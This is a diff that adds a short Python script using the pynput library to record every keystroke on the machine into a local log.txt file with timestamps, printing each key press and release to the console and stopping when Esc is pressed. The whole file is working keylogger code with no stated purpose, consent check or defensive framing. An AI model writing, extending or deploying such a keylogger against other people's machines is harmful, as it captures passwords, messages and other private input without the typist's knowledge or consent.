@@ -1,0 +1,32 @@
+from pynput.keyboard import Key, Listener
+from datetime import datetime
+
+def write_file(key):
+    with open("log.txt", "a") as f:
+        k = str(key).replace("'", "")
+        if k == 'Key.space':
+            f.write(' ')
+        elif k == 'Key.enter':
+            f.write('\n')
+        elif 'Key.' in k:
+            f.write(f'[{k}]')
+        else:
+            f.write(k)
+
+        # Optionally, log time
+        f.write(f" ({datetime.now()})\n")
+
+def on_press(key):
+    write_file(key)
+    try:
+        print('alphanumeric key {0} pressed'.format(key.char))
+    except AttributeError:
+        print('special key {0} pressed'.format(key))
+
+def on_release(key):
+    print('{0} released'.format(key))
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
